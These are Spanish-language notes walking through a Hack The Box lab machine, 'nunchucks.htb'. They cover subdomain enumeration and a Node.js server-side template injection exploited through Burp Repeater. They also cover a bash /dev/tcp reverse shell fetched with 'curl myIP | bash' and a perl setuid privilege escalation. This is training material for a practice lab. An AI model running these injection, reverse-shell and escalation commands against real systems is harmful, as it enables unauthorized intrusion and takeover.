Cuándo estamos ante una máquina nueva, tenemos que empezar con la fase de reconocimiento, que haremos con [[Nmap]].

### RECONOCIMIENTO

Si nuestra máquina tiene el puerto 80 abierto ([[http]]), usaremos el comando:

>[[whatweb]] IP

Pero nos sale un error, eso es porque esa IP no está apuntando hacia la página a la que debería apuntar.

Para solucionar esto, debemos debemos modificar el [[/etc/hosts]], y ponemos la [[ip]] victima apuntando hacia el [[dominio]] al que queremos que apunte.

Nos encontramos ante una página estática, en la que no podemos usar el campo para registrarse.

### SUBDOMINIOS

**Pero, ¿y si hay [[subdominios]]?**

Vamos a usar un diccionario de github para ver si encontramos algo:

1. Buscamos el diccionario de "seclists".

2. Dentro del path "discovery > DNS", encontramos los posibles subdominios más comunes dentro de las páginas webs.

3. Una vez elegido el fichero (podemos elegir el más grande, aunque implique más tiempo), hacemos un [[wget]] del enlace, y ya lo tenemos descargado.

4. Una vez que tenemos el fichero descargado, vamos a usar [[Gobuster]]:

> `gobuster vhost -w diccionary -u URL -k`

EL `-K` ES SOLO PARA CUÁNDO ES [[HTTPS]]

- `vhost`: quiero ver si se aplican de otro hosting.
- `-k`: página segura (HTTPS). 

5. Una vez terminado el escáneo, tendremos los subdominios... LOS SUBDOMINIOS DEBEN INTRODUCIRSE DELANTE DEL DOMINIO, por ejemplo:

> https://store.nunchucks.htb

No nos funcionará, porque hay que añadirlo también al [[/etc/hosts]] (se pone al lado del dominio original):

`ip domain subdomain`

6. Dentro de este subdominio, encontramos un recuadro en el que poder introducir nuestro correo.

Siempre que veamos un recuadro, debemos hacer diferentes pruebas.

Si al introducir algo, esa página nos devuelve algo de texto, lo más seguro es que estemos ante una vulnerabilidad llamada: [[server side template inyection]] o [[ssti]].

Esta vulnerabilidad se puede encontrar poniendo, por ejemplo:

> `{{2*2}}`


7. Una vez que sabemos que estamos ante esta vulnerabilidad, debemos de saber qué tecnologías corren detrás de esta página web usando `whatweb`.

Podemos usar la extensión "[[Wappalyzer]]" para saber más información que con whatweb.

Algo importante es saber en qué lenguaje corre la página web, en este caso: "[[Node.js]]". Ahora que sabemos el lenguaje, y que podemos hacer un [[ssti]], vamos a investigar en Google qué se puede hacer ahora:

> node.js ssti

Y la cosa es encontrar un payload que nos pueda servir para explotar esta vulnerabilidad.

Investigando, veremos que hay una línea de código que si la introduccimos, nos dará un error y nos pedirá que introduzcamos un correo válido.

Cuándo pasa esto, podemos usar burpsuite para ver qué está pasando.

### BURPSUITE
8. Abrimos [[burpsuite]] y ponemos un correo válido, que se pueda enviar. Una vez que estemos investigando el trámite, veremos abajo del todo un campo que está curioso, es el de "email".

Antes no podíamos introducir el exploit en la parte del correo, pero... **¿Qué pasaría si cambiasemos ahora el correo?** 

Si modificamos el correo que habíamos introducido, cambiandolo al código malicioso.

[[REPEATER]]

Si con el código nuevo, le damos a `Control + R`, enviaremos la petición al Repeater, dónde yo puedo hacer pruebas, para ver qué me responde el error.

Enviamos la petición, a ver qué nos devuelve el servidor, y nos devuelve un error, porque tenemos "escapar el texto": 

- Ponemos una barrita a la inversa dónde comienza el texto no reconocido cómo código malicioso (osea, que sale en negrita en vez de verde), y para convertirlo en más código ponemos `\`.

### SHELL RIVERSA

9. Ahora, vemos que si por ejemplo cambiamos la parte de: `tail /etc/hosts` por, por ejemplo, `ls -l`, veremos que tenemos control remoto sobre esta máquina.

**¿Qué hacemos cuándo sabemos que tenemos control remoto sobre una máquina?**

Conseguir la [[Shell Riversa]].

Aquí tenemos muchas opciones: un payload con MSFVENOM, utilizar pyhon para mandarme un fichero [[python]] y a través de un módulo Schokets para enviarme la Shell Riversa...

10. Vamos a hacerlo por la vía fácil, vamos a crear un archivo [[html]] que tenga un código que se encargue de enviarnos una shell riversa con el que nos lo descargue con un servidor python, que se código sea interpretado por [[Bash]] y que nos envíe la shell riversa por [[Netcat]].

	1. Creamos un fichero que se llama [[index-html]].

	2. Ponemos lo siguiente:

		- #!/bin/bash
		- [[bash -i >& /dev/tcp/myIP/port 0>&1]]
		- **la IP coger la de tun0 (HTB), pero nuestra IP es la de eth0**


		Creamos un servidor python por el puerto 80 corriendo, entonces, en la zona de repeater ponemos el siguiente código para ver cómo responde la página cuándo se descargue el siguiente enlace:

		- [curl myIP | bash]

			- [[Curl]]: obtener. en este caso, el documento html, el contenido del servidor web.
			- [[Bash]]: lo que acabas de descargar, interpretámelo con bash y ejecútame lo que está dentro de ese código.

		Abrimos un puerto de escucha con [[Netcat]]: 

		- [[sudo nc -nlvp port]]
			- El puerto debe ser el especificado en el archivo .html.


### ESCALADA DE PRIVILEGIOS

> [[getcap -r / 2>/dev/null]]
> 
> Esto sirve para ver qué cosas puedo hacer con mi actual usuario.

Podemos usar código [[perl]] con los que poder aumentar de privilegios.

Podemos crearnos un script que podemos ejecutar siendo el usuario David:

> perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'







